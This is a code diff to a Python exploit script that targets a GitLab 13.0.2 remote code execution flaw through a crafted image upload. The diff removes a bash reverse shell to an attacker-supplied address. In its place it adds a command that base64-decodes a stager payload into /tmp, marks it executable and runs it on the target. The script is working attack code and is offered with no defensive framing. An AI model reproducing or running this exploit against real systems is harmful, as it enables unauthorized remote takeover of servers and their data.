@@ -3,9 +3,11 @@ from bs4 import BeautifulSoup
 import os
 
 
-def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int) -> bool | Exception:
+def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int, stager: str) -> bool | Exception:
+    print('[+] Attempting to gain initial access with gitlab 13.0.2 RCE on {}'.format(ip_dest))
+
     gitlab_url = 'http://{0}:{1}'.format(ip_dest, port_dest)
-    command = "/bin/bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} 0>&1'".format(ip_src, port_src)
+    command = "/bin/bash -c 'echo {0} | base64 -d > /tmp/stager.sh && chmod +x /tmp/stager.sh && /tmp/stager.sh'".format(stager.decode("utf-8"))
 
     session = requests.Session()
 
@@ -29,4 +31,4 @@ def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int) -> bool | 
     files = {"file": ("rce.jpg", open("rce.jpg", "rb"), "image/jpeg")}
     session.post(url=upload_file_url, files=files, headers={"X-CSRF-Token": token, "Referer": upload_file_url, "Accept": "application/json"}, cookies=cookies)
 
-    os.system("rm rce.jpg && rm rce.txt") # Ask @Jean
+    os.system("rm rce.jpg && rm rce.txt")
